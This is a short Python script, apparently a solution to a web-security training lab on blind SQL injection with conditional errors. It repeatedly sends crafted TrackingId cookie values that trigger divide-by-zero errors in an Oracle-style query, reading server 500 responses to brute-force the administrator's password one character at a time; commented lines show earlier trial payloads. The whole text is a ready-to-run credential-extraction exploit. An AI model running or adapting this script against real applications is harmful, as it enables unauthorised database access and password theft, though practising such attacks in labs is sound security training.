# Lab: Blind SQL injection with conditional errors
from requests import get
import requests, string

URL = "https://0a78003f04a109e280b708e4004c0046.web-security-academy.net/login"
#TID = "vOsHK4HberQYB7xK'||(SELECT '')||'"    #Internal Server Error
#TID="vOsHK4HberQYB7xK'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"    #Internal Server Error
#TID="vOsHK4HberQYB7xK'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"    #Internal Server Error
TID = "vOsHK4HberQYB7xK"
SESSION = "tqAOd1eE2ICp6cvlPEeMCDWWX3tfmju0"
CHARSET = string.ascii_lowercase + string.digits


def is_true(payload):
    r = requests.get(URL, cookies={"TrackingId": payload, "session": SESSION})
    return r.status_code ==500

def extract_password(length=20):
    password = ""
    for pos in range(1, length + 1):
        for ch in CHARSET:
            payload = (f"{TID}'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{ch}' "
                       f"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'")
            if is_true(payload):
                password += ch
                print(f"[{pos}] {ch} -> {password}")
                break
    return password

print("password:", extract_password())